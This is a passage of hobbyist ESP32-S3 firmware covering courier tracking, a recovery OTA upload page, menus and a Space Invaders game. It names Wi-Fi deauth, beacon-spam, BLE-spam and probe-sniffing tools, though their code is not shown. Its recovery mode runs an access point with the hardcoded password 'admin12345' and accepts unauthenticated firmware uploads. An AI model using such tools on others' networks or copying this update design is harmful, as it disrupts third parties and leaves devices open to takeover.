    String url = "http://api.binderbyte.com/v1/track?api_key=" + bb_apiKey + "&courier=" + bb_kurir + "&awb=" + bb_resi;

    http.begin(client, url);
    int httpCode = http.GET();

    if (httpCode == 200) {
        String payload = http.getString();
        JsonDocument doc;
        DeserializationError error = deserializeJson(doc, payload);

        if(!error) {
             JsonObject data = doc["data"];
             const char* st = data["summary"]["status"];

             if (st) courierStatus = String(st);
             else courierStatus = "NOT FOUND";

             JsonArray history = data["history"];
             if(history.size() > 0) {
                 const char* loc = history[0]["location"];
                 if(loc) courierLastLoc = String(loc);
                 else courierLastLoc = "TRANSIT";

                 const char* date = history[0]["date"];
                 if(date) courierDate = String(date);
             }
        } else {
            courierStatus = "JSON ERR";
        }
    } else {
        courierStatus = "API ERR: " + String(httpCode);
    }
    http.end();
    isTracking = false;
}

// ==========================================
// RECOVERY MODE & OTA
// ==========================================
WebServer server(80);

const char* updatePage =
"<style>body{background:black;color:cyan;font-family:Courier;text-align:center;margin-top:20%} .btn{background:#003333;color:white;padding:15px;border:1px solid cyan;cursor:pointer;margin-top:20px}</style>"
"<h1>// RECOVERY SYSTEM //</h1>"
"<form method='POST' action='/update' enctype='multipart/form-data'>"
"<input type='file' name='update' style='color:white'><br>"
"<input type='submit' value='FLASH FIRMWARE' class='btn'></form>";

void drawHeader(String text) {
  display.fillRect(0, 0, 128, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(5, 2); display.print(text);
  display.setTextColor(SSD1306_WHITE);
}

void drawBar(int percent, int y) {
  display.drawRect(10, y, 108, 8, SSD1306_WHITE);
  int w = map(percent, 0, 100, 0, 106);
  display.fillRect(12, y+2, w, 4, SSD1306_WHITE);
}

void runRecoveryMode() {
  WiFi.disconnect();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("S3-RECOVERY", "admin12345");

  server.on("/", HTTP_GET, []() { server.send(200, "text/html", updatePage); });
  server.on("/update", HTTP_POST, []() {
    server.send(200, "text/plain", (Update.hasError()) ? "FAIL" : "OK");
    delay(1000);
    ESP.restart();
  }, []() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
      display.clearDisplay(); drawHeader("RECOVERY MODE");
      display.setCursor(20, 30); display.print("FLASHING..."); display.display();
      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) Update.printError(Serial);
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) Update.printError(Serial);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (Update.end(true)) { display.clearDisplay(); display.setCursor(40,30); display.print("DONE!"); display.display(); }
    }
  });
  server.begin();

  display.clearDisplay();
  drawHeader("! RECOVERY MODE !");
  display.setTextSize(1);
  display.setCursor(0, 20); display.print("WiFi: S3-RECOVERY");
  display.setCursor(0, 35); display.print("IP  : 192.168.4.1");
  display.setCursor(0, 50); display.print("Open IP in Browser");
  display.display();

  while(true) {
      server.handleClient();
      delay(1);
      // Blink LED
      if((millis()/500)%2) digitalWrite(LED_BUILTIN, HIGH); else digitalWrite(LED_BUILTIN, LOW);
  }
}

void checkBootloader() {
  // Check BOOT (GPIO 0) and SELECT (GPIO 14)
  pinMode(0, INPUT_PULLUP); // BOOT
  // BTN_SELECT is already GPIO 14, defined macros used in setup but we need it early here
  // We re-init pinmode just in case
  pinMode(14, INPUT_PULLUP);

  unsigned long start = millis();
  bool enterRecovery = false;

  // Show prompt for 3 seconds
  while (millis() - start < 3000) {
    int timeLeft = 3 - ((millis() - start) / 1000);

    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(10, 10); display.print("HOLD [OK] TO ENTER");
    display.setCursor(25, 20); display.print("RECOVERY MODE");

    display.setTextSize(2);
    display.setCursor(60, 35); display.print(timeLeft);

    int bar = map(millis() - start, 0, 3000, 0, 100);
    drawBar(bar, 55);
    display.display();

    // Check buttons (Active LOW)
    if (digitalRead(0) == LOW || digitalRead(14) == LOW) {
        enterRecovery = true;
        break;
    }
    delay(10);
  }

  if (enterRecovery) {
      runRecoveryMode();
  }
}

void stopWifiTools() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  display.invertDisplay(false);

  // Try to reconnect if credentials exist
  String savedSSID = loadPreferenceString("ssid", "");
  String savedPassword = loadPreferenceString("password", "");
  if (savedSSID.length() > 0) {
      WiFi.begin(savedSSID.c_str(), savedPassword.c_str());
  }
}

// Forward declarations
void showMainMenu(int x_offset = 0);
void showWiFiMenu(int x_offset = 0);
void showAPISelect(int x_offset = 0);
void showGameSelect(int x_offset = 0);
void showSystemMenu(int x_offset = 0);
void showSystemStatusMenu(int x_offset = 0);
void showSystemSettingsMenu(int x_offset = 0);
void showSystemToolsMenu(int x_offset = 0);
void showSystemPerf(int x_offset = 0);
void showSystemNet(int x_offset = 0);
void showSystemDevice(int x_offset = 0);
void showSystemBenchmark(int x_offset = 0);
void showSystemPower(int x_offset = 0);
void runI2CBenchmark();
void showRacingModeSelect(int x_offset = 0);
void showLoadingAnimation(int x_offset = 0);
void showProgressBar(String title, int percent);
void displayWiFiNetworks(int x_offset = 0);
void handleMainMenuSelect();
void handleWiFiMenuSelect();
void handleAPISelectSelect();
void handleGameSelectSelect();
void handleRacingModeSelect();
void handleSystemMenuSelect();
void handleKeyPress();
void handlePasswordKeyPress();
void handleBackButton();
void connectToWiFi(String ssid, String password);
void displayResponse();
void showStatus(String message, int delayMs);
void forgetNetwork();
void refreshCurrentScreen() {
  int x_offset = 0;
  if (transitionState == TRANSITION_OUT) {
    x_offset = -SCREEN_WIDTH * transitionProgress;
  } else if (transitionState == TRANSITION_IN) {
    x_offset = SCREEN_WIDTH * (1.0 - transitionProgress);
  }

  // We don't draw UI for game states, they handle their own display updates
  switch(currentState) {
    case STATE_MAIN_MENU: showMainMenu(x_offset); break;
    case STATE_WIFI_MENU: showWiFiMenu(x_offset); break;
    case STATE_WIFI_SCAN: displayWiFiNetworks(x_offset); break;
    case STATE_API_SELECT: showAPISelect(x_offset); break;
    case STATE_GAME_SELECT: showGameSelect(x_offset); break;
    case STATE_RACING_MODE_SELECT: showRacingModeSelect(x_offset); break;
    case STATE_SYSTEM_MENU: showSystemMenu(x_offset); break;
    case STATE_SYSTEM_PERF: showSystemPerf(x_offset); break;
    case STATE_SYSTEM_NET: showSystemNet(x_offset); break;
    case STATE_SYSTEM_DEVICE: showSystemDevice(x_offset); break;
    case STATE_SYSTEM_BENCHMARK: showSystemBenchmark(x_offset); break;
    case STATE_SYSTEM_POWER: showSystemPower(x_offset); break;
    case STATE_SYSTEM_SUB_STATUS: showSystemStatusMenu(x_offset); break;
    case STATE_SYSTEM_SUB_SETTINGS: showSystemSettingsMenu(x_offset); break;
    case STATE_SYSTEM_SUB_TOOLS: showSystemToolsMenu(x_offset); break;
    case STATE_PIN_LOCK: showPinLock(x_offset); break;
    case STATE_CHANGE_PIN: showChangePin(x_offset); break;
    case STATE_SCREEN_SAVER: showScreenSaver(); break;
    case STATE_LOADING: showLoadingAnimation(x_offset); break;
    case STATE_KEYBOARD: drawKeyboard(x_offset); break;
    case STATE_PASSWORD_INPUT: drawKeyboard(x_offset); break;
    case STATE_CHAT_RESPONSE: displayResponse(); break;
    case STATE_TOOL_SPAMMER: drawSpammer(); break;
    case STATE_TOOL_DETECTOR: drawDetector(); break;
    case STATE_DEAUTH_SELECT: drawDeauthSelect(x_offset); break;
    case STATE_TOOL_DEAUTH: drawDeauthTool(); break;
    case STATE_TOOL_PROBE_SNIFFER: drawProbeSniffer(); break;
    case STATE_TOOL_BLE_MENU: drawBLEMenu(x_offset); break;
    case STATE_TOOL_BLE_RUN: drawBLERun(); break;
    case STATE_TOOL_COURIER: drawCourierTool(); break;
    // Game states handle their own drawing, so no call here
    case STATE_GAME_SPACE_INVADERS:
    case STATE_GAME_SIDE_SCROLLER:
    case STATE_GAME_PONG:
    case STATE_GAME_RACING:
    case STATE_VIDEO_PLAYER:
      break;
    default: showMainMenu(x_offset); break;
  }
}
void drawStatusBar();
void drawWiFiSignalBars();
void drawIcon(int x, int y, const unsigned char* icon);
void sendToGemini();
const char* getCurrentKey();
void toggleKeyboardMode();

// UI Transition Function
void changeState(AppState newState) {
  // Special handling for returning from Screen Saver
  if (currentState == STATE_SCREEN_SAVER) {
      currentState = newState;
      transitionTargetState = newState;
      transitionState = TRANSITION_IN;
      transitionProgress = 0.0f;
  }

  if (transitionState == TRANSITION_NONE && currentState != newState) {
    transitionTargetState = newState;
    transitionState = TRANSITION_OUT;
    transitionProgress = 0.0f;
    previousState = currentState; // Store where we came from

    // Init Screen Saver
    if (newState == STATE_SCREEN_SAVER) {
        if (screensaverMode == 0) initLife();
        else initMatrix();
    }
  }
}

// Game functions
void initSpaceInvaders();
void updateSpaceInvaders();
void drawSpaceInvaders();
void handleSpaceInvadersInput();

void initSideScroller();
void updateSideScroller();
void drawSideScroller();
void handleSideScrollerInput();

void initPong();
void updatePong();
void drawPong();
void handlePongInput();

void initRacing(int mode);
void updateRacing();
void drawRacing();
void handleRacingInput();

void drawVideoPlayer();

// Button handlers
void handleUp();
void handleDown();
void handleLeft();
void handleRight();
void handleSelect();

// LED Patterns
void ledHeartbeat() {
  int beat = (millis() / 100) % 20;
  digitalWrite(LED_BUILTIN, (beat < 2 || beat == 4));
}

void ledBlink(int speed) {
  digitalWrite(LED_BUILTIN, (millis() / speed) % 2);
}

void ledSuccess() {
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);
    digitalWrite(LED_BUILTIN, LOW);
    delay(100);
  }
}

void ledError() {
  for (int i = 0; i < 5; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(80);
    digitalWrite(LED_BUILTIN, LOW);
    delay(80);
  }
}

void ledQuickFlash() {
  digitalWrite(LED_BUILTIN, HIGH);
  delay(30);
  digitalWrite(LED_BUILTIN, LOW);
}

void showBootScreen() {
  display.clearDisplay();

  // Draw the new boot logo
  display.drawBitmap(0, 0, epd_bitmap_09f6b70b000f29d19836dcd2ede0b6e8, 128, 64, SSD1306_WHITE);
  display.display();

  // Hold the boot screen for 3 seconds
  delay(3000);

  // Fade out effect (optional, or just clear)
  display.clearDisplay();
  display.display();
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // High Performance Setup for ESP32-S3 N16R8
  setCpuFrequencyMhz(CPU_FREQ);
  
  // PSRAM check (already initialized by Arduino core if flags set)
  if (psramFound()) {
      Serial.printf("PSRAM Active: %d KB\n", ESP.getPsramSize() / 1024);
  } else {
      Serial.println("PSRAM Not Found!");
  }

  Serial.println("\n=== ESP32-S3 Gaming Edition v2.0 (NTP/Racing/MaxPerf) ===");
  
  // Initialize LittleFS
  if(!LittleFS.begin(true)){
    Serial.println("LittleFS Mount Failed");
  } else {
    loadChatHistory();
  }

  Wire.begin(SDA_PIN, SCL_PIN);
  Wire.setClock(I2C_FREQ); // Fast I2C for smoother display updates
  
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_LEFT, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  
  pinMode(TOUCH_LEFT, INPUT);
  pinMode(TOUCH_RIGHT, INPUT);
  
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);

  pixels.begin();
  pixels.setPixelColor(0, pixels.Color(0, 0, 0));
  pixels.show();
  
  if(!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
    Serial.println(F("SSD1306 allocation failed"));
    for(;;);
  }
  
  ledSuccess();
  
  showFPS = loadPreferenceBool("showFPS", false);
  currentI2C = loadPreferenceInt("i2c_freq", 1000000);
  currentCpuFreq = loadPreferenceInt("cpu_freq", 240);
  selectedAPIKey = loadPreferenceInt("api_key", 1);
  
  highScoreInvaders = loadPreferenceInt("hs_invaders", 0);
  highScoreScroller = loadPreferenceInt("hs_scroller", 0);
  highScoreRacing = loadPreferenceInt("hs_racing", 0);

  pinLockEnabled = loadPreferenceBool("pin_lock", false);
  pinCode = loadPreferenceString("pin_code", "1234");
  screensaverMode = loadPreferenceInt("saver_mode", 0);

  setCpuFrequencyMhz(currentCpuFreq);

  String savedSSID = loadPreferenceString("ssid", "");
  String savedPassword = loadPreferenceString("password", "");

  // Start WiFi in background if credentials exist
  if (savedSSID.length() > 0) {
    WiFi.begin(savedSSID.c_str(), savedPassword.c_str());
    // Init NTP (UTC+7 for WIB) immediately so it syncs once connected
    configTime(25200, 0, "pool.ntp.org", "time.nist.gov");
  }

  // Apply I2C Clock here to ensure it takes effect
  Wire.setClock(currentI2C);

  // Show cinematic boot screen (WiFi connects in background during this)
  showBootScreen();

  // Check for Recovery Mode entry
  checkBootloader();

  if (pinLockEnabled) {
      inputPin = "";
      stateAfterUnlock = STATE_MAIN_MENU; // After boot unlock, always go to main menu
      currentKeyboardMode = MODE_NUMBERS;
      currentState = STATE_PIN_LOCK;
      showPinLock(0); // Ensure keyboard is drawn immediately
  } else {
      showMainMenu();
  }
  
  lastInputTime = millis();
}

void triggerNeoPixelEffect(uint32_t color, int duration) {
  neoPixelColor = color;
  pixels.setPixelColor(0, neoPixelColor);
  pixels.show();
  neoPixelEffectEnd = millis() + duration;
}

void updateNeoPixel() {
  if (neoPixelEffectEnd > 0 && millis() > neoPixelEffectEnd) {
    neoPixelColor = 0;
    pixels.setPixelColor(0, neoPixelColor);
    pixels.show();
    neoPixelEffectEnd = 0;
  }
}

void loop() {
  unsigned long currentMillis = millis();
  perfLoopCount++;

  if (currentMillis - perfLastTime >= 1000) {
      perfFPS = perfFrameCount;
      perfLPS = perfLoopCount;
      perfFrameCount = 0;
      perfLoopCount = 0;
      perfLastTime = currentMillis;
  }
  
  updateNeoPixel();
  updateStatusBarData();

  // LED Patterns
  switch(currentState) {
    case STATE_LOADING:
      ledBlink(100);
      break;
    case STATE_CHAT_RESPONSE:
      ledBlink(300);
      break;
    case STATE_GAME_SPACE_INVADERS:
    case STATE_GAME_SIDE_SCROLLER:
    case STATE_GAME_PONG:
    case STATE_GAME_RACING:
      {
        int blink = (millis() / 100) % 3;
        digitalWrite(LED_BUILTIN, blink < 2);
      }
      break;
    case STATE_MAIN_MENU:
    default:
      ledHeartbeat();
      break;
  }
  
  // Screen Saver Logic
  if (currentState != STATE_SCREEN_SAVER && currentState != STATE_PIN_LOCK && currentState != STATE_CHANGE_PIN && currentState != STATE_GAME_RACING) {
      if (millis() - lastInputTime > SCREEN_SAVER_TIMEOUT) {
          stateBeforeScreenSaver = currentState;
          currentState = STATE_SCREEN_SAVER;
      }
  }

  // Loading animation
  if (currentState == STATE_LOADING) {
    if (currentMillis - lastLoadingUpdate > 100) {
      lastLoadingUpdate = currentMillis;
      loadingFrame = (loadingFrame + 1) % 8;
      showLoadingAnimation();
    }
  }
  
  // Physics updates (120Hz for smooth inputs)
  if (currentMillis - lastPhysicsUpdate > PHYSICS_TIME) {
    // Calculate Delta Time
    if (lastFrameMillis == 0) lastFrameMillis = currentMillis;
    deltaTime = (currentMillis - lastFrameMillis) / 1000.0f;
    lastFrameMillis = currentMillis;
    lastPhysicsUpdate = currentMillis;

    // Poll Game Inputs (Smooth Movement)
    if (currentState == STATE_GAME_SPACE_INVADERS) handleSpaceInvadersInput();
    else if (currentState == STATE_GAME_SIDE_SCROLLER) handleSideScrollerInput();
    else if (currentState == STATE_GAME_PONG) handlePongInput();
    else if (currentState == STATE_GAME_RACING) handleRacingInput();

    switch(currentState) {
      case STATE_GAME_SPACE_INVADERS:
        updateSpaceInvaders();
        break;
      case STATE_GAME_SIDE_SCROLLER:
        updateSideScroller();
        break;
      case STATE_GAME_PONG:
        updatePong();
        break;
      case STATE_GAME_RACING:
        updateRacing();
        break;
    }
  }

  if (currentState == STATE_TOOL_SPAMMER) updateSpammer();
  if (currentState == STATE_TOOL_DETECTOR) updateDetector();
  if (currentState == STATE_TOOL_PROBE_SNIFFER) updateProbeSniffer();
  if (currentState == STATE_TOOL_BLE_RUN) updateBLESpam();

  if (currentState == STATE_VIDEO_PLAYER) {
    drawVideoPlayer();
  }

  // UI Transition Logic
  if (transitionState != TRANSITION_NONE) {
    transitionProgress += transitionSpeed * deltaTime;
    if (transitionProgress >= 1.0f) {
      transitionProgress = 1.0f;
      if (transitionState == TRANSITION_OUT) {
        currentState = transitionTargetState;
        transitionState = TRANSITION_IN;
        transitionProgress = 0.0f;

        // If returning to the main menu, restore the selection. Otherwise, reset it.
        if (transitionTargetState == STATE_MAIN_MENU) {
          menuSelection = mainMenuSelection;
          menuTargetScrollY = mainMenuSelection * 22;
          menuScrollY = menuTargetScrollY;
        } else {
          menuSelection = 0;
          menuScrollY = 0;
          menuTargetScrollY = 0;
        }
      } else {
        transitionState = TRANSITION_NONE;
      }
    }
  }

  // Render UI at 60 FPS
  if (currentMillis - lastUiUpdate > uiFrameDelay) {
      lastUiUpdate = currentMillis;
      perfFrameCount++;

      // Draw current screen with transition offset
      refreshCurrentScreen();

      // Force Draw for Games (since we removed it from the physics loop)
      switch(currentState) {
        case STATE_GAME_SPACE_INVADERS: drawSpaceInvaders(); break;
        case STATE_GAME_SIDE_SCROLLER: drawSideScroller(); break;
        case STATE_GAME_PONG: drawPong(); break;
        case STATE_GAME_RACING: drawRacing(); break;
      }

      // Main Menu Animation (Only if not transitioning)
      if (currentState == STATE_MAIN_MENU && transitionState == TRANSITION_NONE) {
        if (abs(menuScrollY - menuTargetScrollY) > 0.1) {
          menuScrollY += (menuTargetScrollY - menuScrollY) * 0.3;
        } else if (menuScrollY != menuTargetScrollY) {
          menuScrollY = menuTargetScrollY;
        }
      }
  }
  
  // Button handling (only if not transitioning)
  if (transitionState == TRANSITION_NONE && currentMillis - lastDebounce > debounceDelay) {
    bool buttonPressed = false;
    
    // Check buttons
    if (digitalRead(BTN_UP) == LOW) {
      handleUp();
      buttonPressed = true;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      handleDown();
      buttonPressed = true;
    }
    if (digitalRead(BTN_LEFT) == LOW) {
      handleLeft();
      buttonPressed = true;
    }
    if (digitalRead(BTN_RIGHT) == LOW) {
      handleRight();
      buttonPressed = true;
    }
    if (digitalRead(BTN_SELECT) == LOW) {
      handleSelect();
      buttonPressed = true;
    }
    if (digitalRead(BTN_BACK) == LOW) {
      handleBackButton();
      buttonPressed = true;
    }
    
    // Touch buttons (Disable during keyboard typing, PIN Lock, and Racing)
    if (currentState != STATE_KEYBOARD && currentState != STATE_PASSWORD_INPUT &&
        currentState != STATE_PIN_LOCK && currentState != STATE_CHANGE_PIN &&
        currentState != STATE_GAME_RACING) {
      if (digitalRead(TOUCH_LEFT) == HIGH) {
        handleLeft();
        if (currentState == STATE_GAME_SPACE_INVADERS ||
            currentState == STATE_GAME_SIDE_SCROLLER) {
          handleSelect(); // Also shoot
        }
        buttonPressed = true;
      }
      if (digitalRead(TOUCH_RIGHT) == HIGH) {
        handleRight();
        buttonPressed = true;
      }
    }
    
    if (buttonPressed) {
      lastDebounce = currentMillis;
      lastInputTime = currentMillis; // Reset screensaver only on valid input

      // Exit screensaver if active
      if (currentState == STATE_SCREEN_SAVER) {
          if (pinLockEnabled) {
              inputPin = "";
              stateAfterUnlock = stateBeforeScreenSaver;
              currentKeyboardMode = MODE_NUMBERS;
              currentState = STATE_PIN_LOCK;
          } else {
              changeState(stateBeforeScreenSaver);
          }
      } else {
          ledQuickFlash();
      }
    }
  }
}

// ========== SPACE INVADERS GAME ==========

void initSpaceInvaders() {
  invaders.playerX = SCREEN_WIDTH / 2 - 4;
  invaders.playerY = SCREEN_HEIGHT - 10;
  invaders.playerWidth = 8;
  invaders.playerHeight = 6;
  invaders.lives = 3;
  invaders.score = 0;
  invaders.level = 1;
  invaders.gameOver = false;
  invaders.weaponType = 0;
  invaders.shieldTime = 0;
  invaders.enemyDirection = 1;
  invaders.lastEnemyMove = 0;
  invaders.lastEnemyShoot = 0;
  invaders.lastSpawn = 0;
  invaders.bossActive = false;
  
  // Initialize enemies
  for (int i = 0; i < MAX_ENEMIES; i++) {
    invaders.enemies[i].active = false;
  }
  
  // Spawn initial wave
  for (int i = 0; i < 5; i++) {
    invaders.enemies[i].active = true;
    invaders.enemies[i].x = 10 + i * 20;
    invaders.enemies[i].y = 15;
    invaders.enemies[i].width = 8;
    invaders.enemies[i].height = 6;
    invaders.enemies[i].type = random(0, 3);
    invaders.enemies[i].health = invaders.enemies[i].type + 1;
  }
  
  // Clear bullets
  for (int i = 0; i < MAX_BULLETS; i++) {
    invaders.bullets[i].active = false;
  }
  for (int i = 0; i < MAX_ENEMY_BULLETS; i++) {
    invaders.enemyBullets[i].active = false;
  }
  for (int i = 0; i < MAX_POWERUPS; i++) {
    invaders.powerups[i].active = false;
  }
}

void updateSpaceInvaders() {
  if (invaders.gameOver) return;
  
  unsigned long now = millis();
  
  updateParticles();
  if (screenShake > 0) screenShake--;

  // Decrease shield
  if (invaders.shieldTime > 0) invaders.shieldTime--;
  
  // Smooth Enemy Movement
  bool hitEdge = false;
  float enemySpeed = 10.0f + (invaders.level * 2.0f); // Faster

  for (int i = 0; i < MAX_ENEMIES; i++) {
    if (invaders.enemies[i].active) {
      invaders.enemies[i].x += invaders.enemyDirection * enemySpeed * deltaTime;

      if ((invaders.enemyDirection > 0 && invaders.enemies[i].x >= SCREEN_WIDTH - 8) ||
          (invaders.enemyDirection < 0 && invaders.enemies[i].x <= 0)) {
        hitEdge = true;
      }
    }
  }

  if (hitEdge) {
    invaders.enemyDirection *= -1;
    for (int i = 0; i < MAX_ENEMIES; i++) {
      if (invaders.enemies[i].active) {
        invaders.enemies[i].y += 4; // Step down
        // Check if enemy reached player
        if (invaders.enemies[i].y >= invaders.playerY) {
          invaders.lives--;
          triggerNeoPixelEffect(pixels.Color(255, 0, 0), 200); // Red flash
          invaders.enemies[i].active = false; // Enemy disappears
          screenShake = 10;
          if (invaders.lives <= 0) {
            invaders.gameOver = true;
            if (invaders.score > highScoreInvaders) {
                highScoreInvaders = invaders.score;
                savePreferenceInt("hs_invaders", highScoreInvaders);
            }
            if (invaders.score > highScoreInvaders) {
                highScoreInvaders = invaders.score;
                savePreferenceInt("hs_invaders", highScoreInvaders);
            }
            triggerNeoPixelEffect(pixels.Color(100, 0, 0), 1000); // Dim red for game over
          }
        }
      }
    }
  }
  
  // Enemy shooting
  if (now - invaders.lastEnemyShoot > 1000) {
    for (int i = 0; i < MAX_ENEMIES; i++) {
      if (invaders.enemies[i].active && random(0, 5) == 0) {
        // Find empty bullet slot
        for (int j = 0; j < MAX_ENEMY_BULLETS; j++) {
          if (!invaders.enemyBullets[j].active) {
            invaders.enemyBullets[j].x = invaders.enemies[i].x + 4;
            invaders.enemyBullets[j].y = invaders.enemies[i].y + 6;
            invaders.enemyBullets[j].active = true;
            break;
          }
        }
      }
    }
    invaders.lastEnemyShoot = now;
  }
  
  // Move bullets
  float bulletSpeed = 150.0f;
  float enemyBulletSpeed = 90.0f;
  for (int i = 0; i < MAX_BULLETS; i++) {
    if (invaders.bullets[i].active) {
      invaders.bullets[i].y -= bulletSpeed * deltaTime;
      if (invaders.bullets[i].y < 0) {
        invaders.bullets[i].active = false;
      }
    }
  }
  
  for (int i = 0; i < MAX_ENEMY_BULLETS; i++) {
    if (invaders.enemyBullets[i].active) {
      invaders.enemyBullets[i].y += enemyBulletSpeed * deltaTime;
      if (invaders.enemyBullets[i].y > SCREEN_HEIGHT) {
        invaders.enemyBullets[i].active = false;
      }
    }
  }
  
  // Move powerups
  float powerupSpeed = 60.0f;
  for (int i = 0; i < MAX_POWERUPS; i++) {
    if (invaders.powerups[i].active) {
      invaders.powerups[i].y += powerupSpeed * deltaTime;
      if (invaders.powerups[i].y > SCREEN_HEIGHT) {
        invaders.powerups[i].active = false;
      }
    }
  }
  
  // Collision detection - player bullets vs enemies
  for (int i = 0; i < MAX_BULLETS; i++) {
    if (invaders.bullets[i].active) {
      for (int j = 0; j < MAX_ENEMIES; j++) {
        if (invaders.enemies[j].active) {
          if (invaders.bullets[i].x >= invaders.enemies[j].x &&
              invaders.bullets[i].x <= invaders.enemies[j].x + invaders.enemies[j].width &&
              invaders.bullets[i].y >= invaders.enemies[j].y &&
              invaders.bullets[i].y <= invaders.enemies[j].y + invaders.enemies[j].height) {
            
            invaders.bullets[i].active = false;
            invaders.enemies[j].health--;
            
            if (invaders.enemies[j].health <= 0) {
              invaders.enemies[j].active = false;
              invaders.score += (invaders.enemies[j].type + 1) * 10;
              
              spawnExplosion(invaders.enemies[j].x + 4, invaders.enemies[j].y + 3, 10);
              triggerNeoPixelEffect(pixels.Color(255, 165, 0), 100); // Orange flash
              screenShake = 2;

              // Spawn powerup
              if (random(0, 10) < 3) {
                for (int k = 0; k < MAX_POWERUPS; k++) {
                  if (!invaders.powerups[k].active) {
                    invaders.powerups[k].x = invaders.enemies[j].x;
                    invaders.powerups[k].y = invaders.enemies[j].y;
                    invaders.powerups[k].type = random(0, 3);
                    invaders.powerups[k].active = true;
                    break;
                  }
                }
              }
            }
            break;
          }
        }
      }
    }
  }
  
  // Collision - enemy bullets vs player
  if (invaders.shieldTime == 0) {
    for (int i = 0; i < MAX_ENEMY_BULLETS; i++) {
      if (invaders.enemyBullets[i].active) {
        if (invaders.enemyBullets[i].x >= invaders.playerX &&
            invaders.enemyBullets[i].x <= invaders.playerX + invaders.playerWidth &&
            invaders.enemyBullets[i].y >= invaders.playerY &&
            invaders.enemyBullets[i].y <= invaders.playerY + invaders.playerHeight) {
          
          invaders.enemyBullets[i].active = false;
          invaders.lives--;
          triggerNeoPixelEffect(pixels.Color(255, 0, 0), 200); // Red flash
          screenShake = 6;
          
          if (invaders.lives <= 0) {
            invaders.gameOver = true;
            triggerNeoPixelEffect(pixels.Color(100, 0, 0), 1000); // Dim red for game over
          }
        }
      }
    }
  }
  
  // Collision - powerups vs player
  for (int i = 0; i < MAX_POWERUPS; i++) {
    if (invaders.powerups[i].active) {
      if (abs(invaders.powerups[i].x - invaders.playerX) < 8 &&
          abs(invaders.powerups[i].y - invaders.playerY) < 8) {
        
        invaders.powerups[i].active = false;
        
        switch(invaders.powerups[i].type) {
          case 0: // Weapon upgrade
            invaders.weaponType = min(invaders.weaponType + 1, 2);
            break;
          case 1: // Shield
            invaders.shieldTime = 300;
            break;
          case 2: // Extra life
            invaders.lives++;
            break;
        }
      }
    }
  }
  
  // Spawn new wave
  bool allDead = true;
  for (int i = 0; i < MAX_ENEMIES; i++) {
    if (invaders.enemies[i].active) {
      allDead = false;
      break;
    }
  }
  
  if (allDead && now - invaders.lastSpawn > 2000) {
    invaders.level++;
    int numEnemies = min(5 + invaders.level, MAX_ENEMIES);
    
    for (int i = 0; i < numEnemies; i++) {
      invaders.enemies[i].active = true;
      invaders.enemies[i].x = 10 + (i % 5) * 20;
      invaders.enemies[i].y = 15 + (i / 5) * 10;
      invaders.enemies[i].width = 8;
      invaders.enemies[i].height = 6;
      invaders.enemies[i].type = random(0, 3);
      invaders.enemies[i].health = invaders.enemies[i].type + 1;
    }
    
    invaders.lastSpawn = now;
  }
}

void drawSpaceInvaders() {
  display.clearDisplay();

  // Apply Screen Shake
  int shakeX = 0;
  int shakeY = 0;
  if (screenShake > 0) {
    shakeX = random(-screenShake, screenShake + 1);
    shakeY = random(-screenShake, screenShake + 1);
  }

  drawStatusBar();
  
  // Draw HUD (Fixed position, no shake)
  display.setTextSize(1);
  display.setCursor(2, 2);
  display.print("L:");
  display.print(invaders.lives);
  display.setCursor(30, 2);
  display.print(invaders.score);
  display.setCursor(65, 2);
  display.print("HI:");
  display.print(highScoreInvaders);
  
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Draw player (Neon Style)
  if (invaders.shieldTime > 0 && (millis() / 100) % 2 == 0) {
    display.drawCircle(invaders.playerX + 4 + shakeX, invaders.playerY + 3 + shakeY, 8, SSD1306_WHITE);
  }
  display.drawTriangle(
    invaders.playerX + 4 + shakeX, invaders.playerY + shakeY,
    invaders.playerX + shakeX, invaders.playerY + 6 + shakeY,
    invaders.playerX + 8 + shakeX, invaders.playerY + 6 + shakeY,
    SSD1306_WHITE
  );
  
  // Draw enemies (Neon Style)
  for (int i = 0; i < MAX_ENEMIES; i++) {
    if (invaders.enemies[i].active) {
      // Different shapes for different types
      switch(invaders.enemies[i].type) {
        case 0: // Basic
          display.drawRect(invaders.enemies[i].x + shakeX, invaders.enemies[i].y + shakeY, 8, 6, SSD1306_WHITE);
          break;
        case 1: // Fast
          display.drawTriangle(
            invaders.enemies[i].x + 4 + shakeX, invaders.enemies[i].y + shakeY,
            invaders.enemies[i].x + shakeX, invaders.enemies[i].y + 6 + shakeY,
            invaders.enemies[i].x + 8 + shakeX, invaders.enemies[i].y + 6 + shakeY,
            SSD1306_WHITE
          );
          break;
        case 2: // Tank
          display.drawRect(invaders.enemies[i].x + shakeX, invaders.enemies[i].y + shakeY, 8, 8, SSD1306_WHITE);
          display.drawRect(invaders.enemies[i].x + 2 + shakeX, invaders.enemies[i].y + 2 + shakeY, 4, 4, SSD1306_WHITE);
          break;
      }
    }
  }
  
  // Draw bullets
  for (int i = 0; i < MAX_BULLETS; i++) {
    if (invaders.bullets[i].active) {
      display.drawLine(invaders.bullets[i].x + shakeX, invaders.bullets[i].y + shakeY,
                      invaders.bullets[i].x + shakeX, invaders.bullets[i].y + 3 + shakeY, SSD1306_WHITE);
    }
  }
  
  for (int i = 0; i < MAX_ENEMY_BULLETS; i++) {
    if (invaders.enemyBullets[i].active) {
